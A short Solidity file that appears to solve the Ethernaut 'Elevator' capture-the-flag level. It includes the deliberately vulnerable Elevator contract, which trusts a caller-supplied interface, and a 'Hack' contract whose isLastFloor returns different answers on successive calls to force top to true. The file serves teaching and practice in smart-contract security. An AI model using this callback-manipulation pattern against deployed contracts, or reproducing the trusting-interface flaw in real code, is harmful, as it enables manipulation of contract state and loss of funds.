// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Hack{
    Elevator private immutable target;
    uint private count;
    constructor(address _target) {
        target = Elevator(_target);
    }

    function pwn() external{
        target.goTo(1);
        require(target.top(), "top is not true");
    }

    function isLastFloor(uint) external returns (bool){
          count++;
          return count > 1;
    }


}
contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
